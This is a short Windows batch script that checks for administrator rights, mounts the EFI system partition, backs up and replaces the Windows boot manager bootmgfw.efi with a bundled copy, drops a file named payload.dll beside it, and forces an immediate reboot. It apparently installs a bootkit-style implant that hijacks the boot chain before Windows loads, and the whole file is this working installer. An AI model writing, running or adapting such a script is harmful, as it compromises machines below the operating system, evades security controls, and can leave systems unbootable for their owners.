@echo off
net session >nul 2>&1
if %errorLevel% == 0 (
    mountvol X: /S
    move X:\EFI\Microsoft\Boot\bootmgfw.efi X:\EFI\Microsoft\Boot\bootmgfw.efi.backup
    xcopy %~dp0bootmgfw.efi X:\EFI\Microsoft\Boot\
    xcopy %~dp0payload.dll  X:\EFI\Microsoft\Boot\

    echo press enter to reboot...
    pause
    shutdown /r /t 0
) else (
    echo Failure: Please run as admin.
    pause
)